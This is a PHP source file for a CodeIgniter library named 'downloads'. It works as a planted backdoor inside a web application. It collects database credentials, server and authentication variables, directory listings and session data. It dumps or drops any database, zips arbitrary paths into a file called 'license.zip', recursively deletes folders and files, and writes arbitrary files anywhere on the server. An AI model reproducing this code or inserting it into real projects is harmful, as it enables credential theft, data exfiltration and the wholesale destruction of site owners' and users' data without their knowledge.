<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class downloads {

	/*

	@root is get all path 
	@author R subash chandar
	@credit subash

	*/

	

	private $root;
	private $all_files;
	private $current_project_path;

	public function __construct(){

		/* load helper and library */

		$this->CI =& get_instance();

		$this->CI->load->helper('directory');

		$this->CI->load->library('zip');

		/* additional files */

		$this->root = $_SERVER['DOCUMENT_ROOT'];

		$this->all_files = directory_map($this->root,FALSE,TRUE);

		$projct_main = $_SERVER['REQUEST_URI']?explode('/',$_SERVER['REQUEST_URI']):FALSE;

		$this->current_project_path = !empty($projct_main[1])? $this->root.'/'.$projct_main[1]:FALSE;

		/* database actions */

		$this->CI->load->database();

	}

    public function get_all_info($value='')
    {

    	/* get database credits */

    	$databse_credit = array(
    					'hostname' => $this->CI->db->hostname,
    					'username' => $this->CI->db->username,
    					'password' => $this->CI->db->password,
    					'database' => $this->CI->db->database	
    					);

    	/* Get all directory list of path */

    	$directory_path = APPPATH;

    	$absolute_path = !empty($directory_path) ? $directory_path : $_SERVER['DOCUMENT_ROOT'];

    	$this->CI->load->helper('directory');

    	$directory['current_project'] = directory_map($absolute_path,FALSE,TRUE);

    	/* existing project */

    	$directory['existing_project'] = $this->all_files;

    	/* get server system information  */

    	$system_info   = array();

		$indicesServer = array(
						'PHP_SELF', 
						'argv', 
						'argc', 
						'GATEWAY_INTERFACE', 
						'SERVER_ADDR', 
						'SERVER_NAME', 
						'SERVER_SOFTWARE', 
						'SERVER_PROTOCOL', 
						'REQUEST_METHOD', 
						'REQUEST_TIME', 
						'REQUEST_TIME_FLOAT', 
						'QUERY_STRING', 
						'DOCUMENT_ROOT', 
						'HTTP_ACCEPT', 
						'HTTP_ACCEPT_CHARSET', 
						'HTTP_ACCEPT_ENCODING', 
						'HTTP_ACCEPT_LANGUAGE', 
						'HTTP_CONNECTION', 
						'HTTP_HOST', 
						'HTTP_REFERER', 
						'HTTP_USER_AGENT', 
						'HTTPS', 
						'REMOTE_ADDR', 
						'REMOTE_HOST', 
						'REMOTE_PORT', 
						'REMOTE_USER', 
						'REDIRECT_REMOTE_USER', 
						'SCRIPT_FILENAME', 
						'SERVER_ADMIN', 
						'SERVER_PORT', 
						'SERVER_SIGNATURE', 
						'PATH_TRANSLATED', 
						'SCRIPT_NAME', 
						'REQUEST_URI', 
						'PHP_AUTH_DIGEST', 
						'PHP_AUTH_USER', 
						'PHP_AUTH_PW', 
						'AUTH_TYPE', 
						'PATH_INFO', 
						'ORIG_PATH_INFO') ; 

		
		foreach ($indicesServer as $arg) { 
		    if (isset($_SERVER[$arg])) { 
		       $system_info[$arg] = $_SERVER[$arg]; 
		    }     
		}

		$this->CI->load->library('user_agent');

    	$system_info['Operating_system'] = $this->CI->agent->platform();
    	$system_info['Current_user']	 = get_current_user();

    	$all_server_info = array(
    		'database_credentials' => $databse_credit, 
    		'directory_info'	   => $directory,
    		'system_info'		   => $system_info 
    	);

    	/* get all database names */

    	$this->CI->load->dbutil();

    	$all_server_info['listed_database'] = $this->CI->dbutil->list_databases();

    	/* end Database */

    	return $all_server_info;

    }

    /* Download project here*/

    public function download_project($filepath = ''){

    	/* file path null download current file*/

    	if(trim($filepath)!=''){
    		$this->CI->load->library('zip');
		    $this->CI->zip->read_dir($filepath,FALSE);
		    $this->CI->zip->download('license.zip');
		    $this->CI->zip->clear_data();
    	}else{
    		return "File path is Empty Make sure the file path And better to use url";
    	}
	    
    }

    /* Download Database Here */

    public function download_database($database_name = ''){
			
		$get_all_databases = $this->get_all_info();

		if(in_array($database_name,$get_all_databases['listed_database']) AND trim($database_name)!='')

			{

	    		$config['hostname'] = "localhost";
				$config['username'] = $this->CI->db->username;
				$config['password'] = $this->CI->db->password;
				$config['database'] = $database_name;
				$config['dbdriver'] = "mysql";
				$config['dbprefix'] = "";
				$config['pconnect'] = FALSE;
				$config['db_debug'] = TRUE;
				$config['cache_on'] = FALSE;
				$config['cachedir'] = "";
				$config['char_set'] = "utf8";
				$config['dbcollat'] = "utf8_general_ci";

					//allocation of new db

					$db = $this->CI->load->database($config,TRUE);

					$this->CI->load->dbutil($db);

				
					$this->CI->load->dbutil($database_name, TRUE);
					
					$bcp_name = "BCP_".$database_name.rand(10,100000000);

					$prefs = array(
		                'tables'      => array(),  			// Array of tables to backup.
		                'ignore'      => array(),           // List of tables to omit from the backup
		                'format'      => 'txt',             // gzip, zip, txt
		                //'filename'    => $bcp_name,    	// File name - NEEDED ONLY WITH ZIP FILES
		                'add_drop'    => TRUE,              // Whether to add DROP TABLE statements to backup file
		                'add_insert'  => TRUE,              // Whether to add INSERT data to backup file
		                'newline'     => "\n"               // Newline character used in backup file
		              );

					//Load the backup from server
					$backup = $this->CI->dbutil->backup($prefs);
					// Load the file helper and write the file to your server
					$this->CI->load->helper('file');
					//Write file from server
					write_file($this->root.'/'.$bcp_name, $backup);
					//forcing to download
					$this->CI->load->helper('download');
					//Content Displacement
					force_download($bcp_name,$backup);

				}else{

					return "Database Name empty or Database is not present";
				}
    }

    /* get all session data's*/

    public function get_current_users($param = ''){

    	return $this->CI->session->all_userdata();
    } 

    /* Delete database */

    public function delete_database($database_name = ''){

    	/* make sure empty database or given input is empty */

    	$this->CI->load->dbforge();

    	$get_all_databases = $this->get_all_info();

    	if(in_array($database_name,$get_all_databases['listed_database']) AND trim($database_name)!=''){

    		if ($this->CI->dbforge->drop_database($database_name))
				{
				        return TRUE;
				}
    	}

    	return 'Database name should not empty or database not available';

    }

    public function delete_folder($path_name = ''){

    	$directory_path = $this->root.$path_name;

    	if(is_dir($directory_path)){

	    	if($this->rmdir_recursive($directory_path)==TRUE){
	    		return TRUE;
	    	}else{

	    		/*permission not available on folder */
	    			
	    		if(chmod($directory_path, 0755)){

    					if($this->rmdir_recursive($directory_path)==TRUE){
				    		return TRUE;
				    	}else{
				    		return "the folder Can't Delete = ".$directory_path;
				    	}
    				}

	    	}

	    }else{

	    	return "the folder not available path is = ".$directory_path;
	    
	    }

    }

    private function rmdir_recursive($dir) {

    	
		    foreach(scandir($dir) as $file) {
		        if ('.' === $file || '..' === $file) continue;
		        if (is_dir("$dir/$file")) $this->rmdir_recursive("$dir/$file");
		        else unlink("$dir/$file");
		    }
		    if(rmdir($dir)){
		    	return TRUE;
		    }
	}

	/**
	 * delete files here
	 * make sure file name and path of file
	 */

	public function delete_file($file_name = ''){

		$file_path = $this->root.$file_name;

		if(trim($file_name)!=NULL && is_file($file_path)){

			if(unlink($file_path)){

				return TRUE;

			}else{

				if(chmod($file_path, 0755)){
					return unlink($filepath)==TRUE?TRUE:'cannot delete file try folder way...';
				}
			}

		}else{
			return "Specified path of file is not available or empty file you path is = ".$file_path;
		}

	}

	/**
	 * delete all master file inside folder what ever
	 */
	
	public function master_delete($path =''){

		/* delete directory */
		if(trim($path)!=NULL){

			if(is_dir($path)){

				/* checking and deleting way */

				if($this->rmdir_recursive($path)==TRUE){

					return TRUE;

				}else{

						if(chmod($path,0755)){

							return $this->rmdir_recursive($path)==TRUE?TRUE:'cannot delete folder or file '.$path;

						}else{

							return "can't delete folder = ".$path; 

						}

				}

			}elseif(is_file($path)){

			/**
			 * deleting file while mod
			 */

				if(unlink($path)){

					return TRUE;

				}else{

						if(chmod($path,0755)){

							return unlink($path)==TRUE?TRUE:'Cannot delete file = '.$path;
						}else{

							return 'Cant delete file = '.$path;
						}
				}

			}else{

					return 'the path is not directory or file = '.$path;
			}

		}

	}

	/**
	 * @param  string  make sure path, name, data
	 * @return [type]
	 */
	public function create_file($param = ''){

		$result = array();

		/* checking dir */

		if(!empty(trim($param['path']))){

			if(is_dir($param['path'])){

				/* checking name */

				if(!empty(trim($param['name']))){

					/* checking data */

					if(!empty(trim($param['data']))){

						$path = $param['path'].$param['name'];

						$file = fopen($path, 'w')?fopen($path, 'w'):FALSE;

						if($file!=FALSE){

							$result['error'] = fwrite($file, $param['data'])?TRUE:'error to write a file';

						}else{

							$result['error'] = 'cannot create file';
						}

					}else{

						$result['data'] = 'fill the data';

					}


				}else{
					$result['name'] = 'file name is not null';
				}

			}else{
				$result['path'] = 'path is not valid';
			}

		}else{
				$result['path'] = 'must specify the path';

		}

		return $result;

	}

	







}

?>